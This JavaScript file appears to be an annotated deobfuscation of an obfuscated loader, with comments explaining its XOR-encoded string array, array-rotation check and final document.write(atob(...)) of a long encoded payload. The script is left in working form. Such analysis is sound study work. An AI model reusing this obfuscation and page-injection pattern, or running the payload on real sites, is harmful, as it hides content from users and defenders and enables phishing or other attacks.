let email = 'ZXhhbXBsZUBlbWFpbC5jb20='; // base64 encoded email
function get_array() { //first invocation of get_array
    var hex_array = ['3e42534f45476c', '3a4e685d60724e', '7c79627f6e', '3d3c383e383d3f5e445d7c7f51', '3a393e3e33393f3241586a7d6946', '3a3b393f3b3d3b586244446272', '3933333c333c3d7c527d716744', '32393a3d3e3f60655d696069', '383f323e3a3e3b696c676c516d', '3a3d695c7b446f60', '3d5e5b67686768', '5b484d4e5f3b455e5c5d494d424c633b695c7c20486173646f4c3a78424c73636966683242665d7e42613f4048617364515c4d605b6c646c42484a6c5b484e7f47584a336838496369613e5a525c3e615153593b525849736f5c606c5239637b6839737b52724962686667716a395d3b424c6363695c413a68666f67686249635148497c693841616a4c5d3b6f4c4e6c68386f7b69665e6c52385d7c6a5c3b6c68665d7c68665d64515c3e605153417b6f4849616a5c73786f5c3b6c52664d6169393f6c6f6632786f53493b52535967424c67726f534167424359726a583a3b6a534a7e5b483271684c4d7e5b624a7f475f3f405b483264515c4d605b6c643342583b7f424f737c5b60677e424c3a7d694c737b6f4849676e4c4567684359676f53427842435967696659676866737d6a5c3f6c5239677869435d7f424c513a513967636f4849606972493a6f4849675258497251534972515c6367696659676866673b424c597d694c32725158497f515c4d3b694c326351623f3347384a2042483b7f5b6c6433526632606e5f3f4042484a6c424f73715238417b68435a2048624a6c42484a6c42484a6c48624a6c42484a6c42484a6c5239327e68385a6c684359726a667f7169724a324248637d6a6667626f394e7b424f3b204243784042484a6c42484a6c42484a6c42484a6c69397b7b52656f63424f3b6c69397b7b52656f6347654167684c736352395e64473a7f685c3a3b7d47484a65534d73694172607e68665d7c694c4d6151586c7d5c3a736f5358337842486f68534d3b65405f784042484a6c42484a6c42484a6c42484a6c6f664d724243497b694c737d6866673d51584a32424c3e676f724958515c6f4d6e434a64413a7f68534f33665358686c4072497d6a6667626f394e6c40724a655b586369536252615358647b4172603c48624a6c42484a6c42484a6c42484a6c424351636862497c6a5c3e676f435963424f3b6c684c6778694c32726a537b6747665d3f515c4664694c32615253597b69393f7e68395d6368664564405f786c4772336c5e385d7e6f4849716a5341786939677e424c6363695c413a68666f676862497f6a5c3e7b69584963694c45636f434163424c7b7d6f397c7e48624a6c42484a6c42484a6c42484a6c424341676f435d726962497c6a5c3e676f435963424f3b325b58497e6f5c7378424f336c4172686c44624960515c457d514c5d5d5e60674f69393a7c69393e6769655a64684c677e5153593b525d787353583e7251534978525c4567404832684072326547484a654248687b405f784042484a6c42484a6c424849324248337d584c4d7f424c637d5239786c5239327f695c326069724964525c3a626f5341655153426c514c327869384167424c4563684c6761693973634243413a69534a7e486c646c42484a6c42484a6c42434164465f453d444c7b6769535a6c5b58497c6f43417a6a38457d40486f674172606c5b5f3b6c4172686c5b7249726a4f4e716e61637a515c3a3b424f646c684359726a667f7169726c655158687b447c646c42484a6c5b4832715238417b68435a20424f7c6347583b6c5b434a205e665d7c68665d64515c3e605153417b6f4849676838456742435d3b474849656866323a69665a6c6866323a69665a6c696632716f43413a5148493b69393e656f5c5e6c5266323a514c677e4243497d6866786c694c327b69624971515c5a6c5239327f695c32606972496169393e71515c453b5153593a6862493b6866607f6f4c677c47617c7d684f3f6c47583b2048624a6c42484a33683945726a53493b4243457252713b626a43593b6843463d477232616939596747667b736f5c5d726e583e6169393b7d6a654d3a5153413e475f467e46623f73476545786a5c3b7e695c677e47667b714262497b696559675138417b6f43603242654564525f463f45483a475861457d466059476f4e67796f6767415871455d595e3e3d695e3b38583b45795e65427d68605e3e473a4d7c517151635a5d7b4358656f4c594e3a5c5f604e7d593849435960523e46396352684e683a58397f444262496168663271683932726a5c6f7b69613b62525c3e7d6965677f69385d7142613f33473845616866677c6f4f3f40485f73715238417b68435a6c683841615b5841646f43597c6871647d4739456069667b714766457869385d605166736368665e7e5239327f47394d7a52536c7d694c67626872327c6938497c5153427e6a65467d46583f7346623f3e47385d7f5148327c6938497c5153427e695c677e47667b714262497b696559675138417b6f43603242654564525f463f45483a49684e3e6251396c3e5a627f51465d4d476f4352715e663f385d71457f513a493f6a4d5e3e5872325f523a4d715a5d4a386a4d5d7b52676c71445c643851664d79596749716a3851526f53453951664e7c526159594262496168663271683932726a5c6f7b69613b62525c3e7d6965677f69385d7142613f33473845616866677c6f4f3f40485f73715238417b68435a6c683841615b5841646f43597c6871647d47393a636e4c456069623e626939323b6838597252534961514c3f7e5239327f4739417d693859716f4341636848333b47614a7e4648327a687232626939323b6838597252534a7e695c677e47667b714262497b696559675138417b6f43603242654564525f463f45483a405c6742395e3849676a666c3b5d5f4a72514f637a5f385a396f60734d584c5167473b7b59593967585e6745595e53635f51605153684c60735f534d3a5d6659496e5c7b5d5253423a407168395e4d514f695d67784262496168663271683932726a5c6f7b69613b62525c3e7d6965677f69385d7142613f33473845616866677c6f4f3f4042484a6c424f73715238417b68435a6c683841615b5841646f43597c6871647d47394d7a52536c7e5139327d513973675253497b68723e6169393b7d525c7b636e4832786a5c417147397b736f5c5d726e5833724761427e4548327a68535d676865607e695c677e47667b7142613f33473845616866677c6f4f3f3342583b7f424f737c5b605d6342435167694c673b4243413a69534a78424c41726a53457951535a6c6f535a6c68395d604243497d6866786c5239637d68484962515c5d66424c67726f5341674243457b69655a7e5b48327c5b624a7f475f3f4042484a6c424f73715238417b68435a6c683841615b5841646f43597c6871647d4738453b525c4579684c4d3b6a483e626939323b6838597252534961514c3f7e5239327f4739417d693859716f4341636848333b47614e7e4672327a687232626939323b6838597252534a7e695c677e47667b7142613f33473845616866677c6f4f3f4042484a6c424f7c6347583b6c5b43457c525c3f2041437f79525c737b695c4d3b45383b334738457c525c3f2042483b7f5b6c646c42484a6c5b4345616866677c6f484971686646324266633b6f4349714462337d45615a7246715238454f523a46723b7346714271445f6c3a45614e384766457d68723e6368483a71515c323a69483e7f6e534d61694c323a51483e6169393b7d5253593b525c4564415f414c5266327d6f43453b68664d7c47663a7b69623e7a687242205b4832715238417b68435a2048617c7d526632606e5f3f4048617c7d6a43597f694f3f36', '383a39323e393839584d605d475a', '3f3a3d3d3b32324a464352466d'];
    //var hex_array has 14 arguments
	get_array = function() { //This is what the function will do if called again
        return hex_array; //Just return the array
    };
    return get_array();
}

//The above function is called 'self redefinition', which: Avoids using global variables, saves memory, optimizes performance, and obfuscates the code
// What happens is the first time this function is called, it initializes the hex_array array. 
// It then 'redefines' itself to just return the array. It then calls itself to return the array.
// So if the function gets called again, it looks like this: function() { return hex_array; }

var decode_function_reference = decode_function; // Just setting a variable equal 

function decode_function(args_array, constant_undefined) { //first invocation of decode_function
    var encoded_array = get_array();
	
    return decode_function = function(index, bWp$Odkk) {
        index = index - 180; //Subtracts 180 from input index just for obfuscation
        var hex_at_index = encoded_array[index];
        if (decode_function['has_initialized'] === undefined) { // see if the property doesn't exist, so it will run the below function
		
            var xor_function = function(hex_string) { //function expression is not hoisted, meaning this variable cannot be called above this line, because it isn't declared.
			
				// The following section below is creating multiple values, to be used in sequence
                var constant_11 = 11, //The variable constant_11 is just equal to 11
					
                    byte_array = new Uint8Array(hex_string['match'](/.{1,2}/g)['map'](hex_byte => parseInt(hex_byte, - 5168))),
					// we create the variable byte_array, which is going to hold the value of this long ass function
					// The first part of this function is creating a Uint8Array (8-bit unsigned integers), and takes this whole thing as its argument
					// hex_string is going to use the .match() method with the regex (/.{1,2}/g), which splits a string into groups of two characters (ex: abcdef1234 = 'ab', 'cd,' ...)
					// Next, we run the .map() function [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map], performing the parseInt(x, - 5168) on every element in the array
                    xor_array = byte_array['map'](ts$gglo => ts$gglo ^ constant_11),
					// Then, xor_array is going to do the same .map() function, which is going to take each element and XOR it with constant_11 (11)
                    decoder = new TextDecoder(),
                    decoded_array = decoder['decode'](xor_array);
					// Finally, we make a TextDecoder decoder, and set the variable decoded_array equal to the decoded array
                return decoded_array; // Return the finalized decoded array
            };
            decode_function['xor_function_reference'] = xor_function, // Here we set decode_function's xor_function_reference property equal to the function xor_function
			args_array = arguments, //arguments is a special JavaScript object that holds all parameters passed to the function, so args_array now holds [index (int), bWp$Odkk (undefined)]
			decode_function['has_initialized'] = !![]; // This sets the decode_function property has_initialized to true ([] == true, ![] == false, !![] == true), meaning it skips this whole block after running once
        
			console.log("Decoded Array:", encoded_array.map(hex => decode_function['xor_function_reference'](hex))); // CONSOLE.LOG SECTION
		}
		
        var first_encoded = encoded_array[0], //first_encoded is now equal to the first element in the array array
			yKM_PfdYVh = index + first_encoded, // yKM_PfdYVh is now equal to index + first_encoded (which is going to be one of the bytes in the array (unsure yet) plus the bytes at [0](?), may just return an int
            BmGLwNb_vKpLyRetqx = args_array[yKM_PfdYVh]; // BmGLwNb_vKpLyRetqx is now going to be equal to the argument of args_array at the yKM_PfdYVh location 
			
			
        return !BmGLwNb_vKpLyRetqx //The ? is a part of a ternary operator, paired with the : operator below to make an if ... else statement (condition ? expressionIfTrue : expressionIfFalse;)
		? (decode_function['RDtkns'] === undefined && (decode_function['RDtkns'] = !![]), // If RDtkns is undefined, set it to true (This is a lazy initialization to ensure RDtkns only gets set once)
		hex_at_index = decode_function['xor_function_reference'](hex_at_index), // Runs the xor_function_reference property (which is the function xor_function) on hex_at_index, setting hex_at_index equal to the XOR'd value
		args_array[yKM_PfdYVh] = hex_at_index) // Sets args_array's yKM_PfdYVh property equal to the value hex_at_index
		: // If the condition is false (as in if BmGLwNb_vKpLyRetqx is true)
		hex_at_index = BmGLwNb_vKpLyRetqx, // Sets hex_at_index equal to the value BmGLwNb_vKpLyRetqx
		hex_at_index; // Returns hex_at_index
		
		// The above block is a decrypt / cache mechanism, so it only decrypts itself once and always returns the decrypted value
    }, 
	decode_function(args_array, constant_undefined); //Finally, the function calls itself (which does the same redfining as stated above). So the first call to this function does the 'setup', and now whenever it is called it is
	//                                 Running the second version of the function, which has args_array as an array with the two arguments [index (int), bWp$Odkk (undefined)]
}

(function(hex_array_renamed, constant_933579) { // IIFE, type of function that runs when it is called, using the two args at the end of it (get_array and 933579)
    var decode_function_renamed = decode_function,
        hex_array_renamed_again = hex_array_renamed();
    while (!![]) { // while true loop to run the decode_function_renamed function many times and do all the weird math below
        try {
            var order_check = parseInt(-parseFloat(decode_function_renamed(0xb5)) / 1) * //index of 1
			(-parseFloat(decode_function_renamed(0xba)) / 2) + //index of 6
			parseFloat(decode_function_renamed(0xbc)) / 3 + //index of 8
			parseFloat(decode_function_renamed(0xb7)) / 4 + //index of 3
			Math['max'](-parseFloat(decode_function_renamed(0xb4)) / 5, //index of 0
			-parseFloat(decode_function_renamed(0xbe)) / 6) * //index of 10
			Number(-parseFloat(decode_function_renamed(0xc1)) / 7) + //index of 13
			Math['trunc'](parseFloat(decode_function_renamed(0xbd)) / 8) * //index of 9
			Math['max'](-parseFloat(decode_function_renamed(0xbb)) / 9, //index of 7
			-parseFloat(decode_function_renamed(0xb9)) / 10) +  //index of 5
			parseInt(-parseFloat(decode_function_renamed(0xb8)) / 11) + //index of 4
			-parseFloat(decode_function_renamed(0xc0)) / (12); //index of 12
            // This variable performs math on the elements in the hex array, as a way of checking their order
			if (order_check === constant_933579) {
				console.log("Final Ordered Array:", hex_array_renamed_again);
				break;
			}				// If order_check is equal to constant_933579, break (when order_check === constant_933579, they are in the correct order)
            else hex_array_renamed_again['push'](hex_array_renamed_again['shift']()); // Removes the first element of hex_array_renamed_again and pushes it to the end of the array
        } catch (error) { //if there's an error (undefined, empty, or whatever), just do the same shift/push
            hex_array_renamed_again['push'](hex_array_renamed_again['shift']());
        }
    }
}(get_array, 933579), document[decode_function_reference(0xb6)](atob(decode_function_reference(0xbf)))); // This runs the initial array function, likely using 933579 as the target value to compare to (see math above)
//																							Then, it decodes a base64-encoded string (retrieved by decode_function_renamed(0xbf) 11th element in array, array[10]) and uses that decoded value to call a DOM method 
//																							(e.g., document.getElementById() or something similar, depending on what decode_function_renamed(0xb6) 3rd element in array array[2] resolves to).